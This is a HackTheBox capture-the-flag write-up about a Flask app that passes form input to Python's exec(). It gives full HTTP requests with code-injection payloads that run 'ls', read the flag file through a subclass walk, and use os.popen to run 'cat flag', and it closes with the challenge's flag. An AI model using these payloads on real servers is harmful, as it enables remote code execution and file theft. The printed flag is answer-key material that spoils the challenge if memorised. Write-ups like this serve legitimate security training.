---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags:
  - code-review
  - command-injection
  - jail-escape
  - python-exec
  - flask
---
>[!quote]
> aw man, aw geez, my grandpa rick is passed out from all the drinking again, where is a calculator when you need one, aw geez****


## Information Gathering

Home page generates random numbers any time is refreshed:

![Pasted image 20210908155550.png](Pasted_image_20210908155550.png)

![Pasted image 20210908155626.png](Pasted_image_20210908155626.png)

Source code contains a `/debug` comments suggesting the presence of a `/debug` endpoint:

![Pasted image 20210908155816.png](Pasted_image_20210908155816.png)

![Pasted image 20210908155859.png](Pasted_image_20210908155859.png)

## The bug

Applications uses `exec()` in order to assign garage's attributes:

```python
def calc(recipe):
	global garage
	garage = {}
	try: exec(recipe, garage)
	except: pass

...

def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
	@wraps(func)
	def federation(*args, **kwargs):
		ingredient = ''.join(choice(lowercase) for _ in range(10))
		recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))
	...
	calc(recipe)
```

However it accepts user supplied input when sending POST data:

```python
if request.method == 'POST':
			ingredient = request.form.get('ingredient', '')
			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
		...
		if garage.get(ingredient, ''):
			return render_template('index.html', calculations=garage[ingredient])
...
@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
	return render_template('index.html')
```

HTTP request (remember to set `Content-type: application/x-www-form-urlencoded`) [^1]

[^1]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST

```
POST / HTTP/1.1
Host: 46.101.23.188:31846
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: io=3835ca78e28842b3a4d2cf1eec9b8d51; session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXJFQkNkZUFlYSJ9.YR1RRg.g4eore-ZESRjkoTFp6WI8fQwsXI
Upgrade-Insecure-Requests: 1
Content-Length: 34
Content-type: application/x-www-form-urlencoded

ingredient=test&measurements=10099
```

HTTP response:

![Pasted image 20210908161858.png](Pasted_image_20210908161858.png)

## Exploitation

Because user supplied input is passed to the `exec()` function [^2] it is possible to send arbitrary python code that will be evaluated and executed:

[^2]: https://www.programiz.com/python-programming/methods/built-in/exec

```
POST / HTTP/1.1
Host: 46.101.23.188:31846
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: io=3835ca78e28842b3a4d2cf1eec9b8d51; session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXJFQkNkZUFlYSJ9.YR1RRg.g4eore-ZESRjkoTFp6WI8fQwsXI
Upgrade-Insecure-Requests: 1
Content-Length: 72
Content-type: application/x-www-form-urlencoded

ingredient=test&measurements=__import__('subprocess').check_output('ls')
```

![Pasted image 20210908162344.png](Pasted_image_20210908162344.png)

HTTP Request (payload from HackTricks [^3]):

[^3]: https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes

```
POST / HTTP/1.1
Host: 46.101.23.188:31846
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: io=3835ca78e28842b3a4d2cf1eec9b8d51; session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXJFQkNkZUFlYSJ9.YR1RRg.g4eore-ZESRjkoTFp6WI8fQwsXI
Upgrade-Insecure-Requests: 1
Content-Length: 90
Content-type: application/x-www-form-urlencoded

ingredient=test&measurements=().__class__.__bases__[0].__subclasses__()[40]('flag').read()
```

Also `__import__("os").popen("cat flag").read()` is a valid payload

![Pasted image 20210908163039.png](Pasted_image_20210908163039.png)

## Flag

>[!success]
>`HTB{n3v3r_trust1ng_us3r_1nput_ag41n_1n_my_l1f3}`
